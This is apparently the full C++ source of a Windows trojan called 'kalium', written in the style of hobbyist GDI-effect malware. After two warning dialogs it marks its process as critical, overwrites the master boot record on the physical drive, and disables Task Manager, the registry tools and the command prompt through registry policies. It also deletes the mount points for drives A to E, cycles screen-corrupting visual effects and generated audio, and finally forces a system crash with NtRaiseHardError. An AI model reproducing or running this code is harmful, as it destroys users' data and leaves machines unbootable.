#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include "bootrec.h"
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 32768, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * tan(x ^ y));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

HRGN CreateHexagonRgn(int x, int y, int size) {
	POINT points[7];
	double angle = 2 * M_PI / 6;
	for (int i = 0; i < 6; i++) {
		points[i].x = x + (int)(size * cos(i * angle));
		points[i].y = y + (int)(size * sin(i * angle));
	}
	points[6] = points[0];
	return CreatePolygonRgn(points, 7, WINDING);
}

VOID WINAPI ci(int x, int y, int w, int h) {
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateHexagonRgn(x, y, w / 2);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500;
	int h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++) {
		const int size = 1000;
		int x = rand() % (w + size) - size / 2;
		int y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100) {
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(10);
		}
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].g += 5;
			rgbScreen[i].b += 5;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI plgblt(LPVOID lpParam) {
	RECT rect;
	POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		lpt[0].x = rect.left - 6; lpt[0].y = rect.top + 6;
		lpt[1].x = rect.right - 6; lpt[1].y = rect.top - 6;
		lpt[2].x = rect.left + 6; lpt[2].y = rect.bottom - 6;
		PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right + rect.left, rect.bottom + rect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI heptagon(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		int cx = x + 50, cy = y + 50;
		int rad = 50;
		POINT heptagonPoints[7];
		for (int i = 0; i < 7; ++i) {
			double angle = 2.0 * M_PI * i / 7;
			heptagonPoints[i].x = cx + static_cast<int>(rad * cos(angle));
			heptagonPoints[i].y = cy + static_cast<int>(rad * sin(angle));
		}
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Polygon(hdc, heptagonPoints, 7);
		if (cy >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (cx >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (cy <= 0) {
			sy = 1;
		}
		if (cx <= 0) {
			sx = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI woah(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, rand() % 10, rand() % 10, x - 20, y - 20, hdc, 0, 0, x, y, 0x1900AC010E);
		StretchBlt(hdc, rand() % 10, rand() % 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCAND);
		StretchBlt(hdc, rand() % 10, rand() % 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCPAINT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI hell1(LPVOID lpParam) {
	double angle = 0.0;
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int xadd = cos(angle) * 100;
		int yadd = sin(angle) * 100;
		BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, NOTSRCERASE);
		angle += M_PI / 8;
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI bitblt(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		RECT rect;
		HWND hwnd = GetDesktopWindow();
		GetWindowRect(hwnd, &rect);
		SetStretchBltMode(hdc, STRETCH_HALFTONE);
		BitBlt(hdc, rect.left + rand() % 1 + 1, rect.top + rand() % 1 + 1, rect.right + rand() % 1 + 1, rect.bottom + rand() % 1 + 1, hdc, rect.left, rect.top, SRCPAINT);
		BitBlt(hdc, rect.left + rand() % 1 - 1, rect.top + rand() % 1 - 1, rect.right + rand() % 1 + 1, rect.bottom + rand() % 1 - 1, hdc, rect.left, rect.top, SRCINVERT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textout(LPVOID lpvd) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		CHAR username[256];
		DWORD dwUserSize = sizeof(username);
		GetUserNameA(username, &dwUserSize);
		HFONT hfnt = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_MEDIUM, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		SetBkMode(hdc, 0);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % w, rand() % h, username, strlen(username));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			data[i].rgb = (data[i].rgb * 2) % (RGB(0, 255, 0));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI rantunnel(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		StretchBlt(hdc, 0, 0, rand() % sw, rand() % sh, hdc, 0, 0, sw, sh, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 50;
			*((BYTE*)data + 4 * i + v) = ((BYTE*)(data + i + v))[v] ^ byte;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI polygon(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		POINT vertices[] = { { rand() % w, rand() % h }, { rand() % w, rand() % h }, { rand() % w, rand() % h } };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t * (t >> 9 | t >> 13) | t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(150 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11) + 100 ^ 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * (t >> 3 | t >> 4 | t >> 9) + (t >> 11 & t << 2) ^ 2 * (t >> 16 | t | t >> 7) + 32 * (t >> t & 32));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() { //credits to Comium92
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * t * (666 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t << 2 | t >> 5 | t ^ 73) & (t << 10 | t >> 11)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(150 * (t >> 7 | 3 * t | t >> (t >> 15)) + (t >> 8 & 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 1 | t >> (t & 32768 ? 4 : 3) | t & t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI shaking(LPVOID lpParam) {
	int r = 10;
	while (true) {
		RECT rect;
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect);
		int po = rand() % 4 + 1;
		if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, 0);
		if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, 0);
		if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, 0);
		if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, 0);
		Sleep(rand() % 90 + 10);
	}
}

DWORD WINAPI dvmp(LPVOID lpParam) {
	DeleteVolumeMountPointA("A:\\");
	DeleteVolumeMountPointA("B:\\");
	DeleteVolumeMountPointA("C:\\");
	DeleteVolumeMountPointA("D:\\");
	DeleteVolumeMountPointA("E:\\");
	return 1;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as kalium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"kalium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"kalium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			ShellExecuteA(NULL, NULL, "mspaint", NULL, NULL, SW_SHOWDEFAULT);
			Sleep(5000);
			CreateThread(0, 0, shaking, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, wef, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			HANDLE thread2dot2 = CreateThread(0, 0, heptagon, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, dvmp, 0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, woah, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, hell1, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, bitblt, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, rantunnel, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, polygon, 0, 0, 0);
			sound7();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}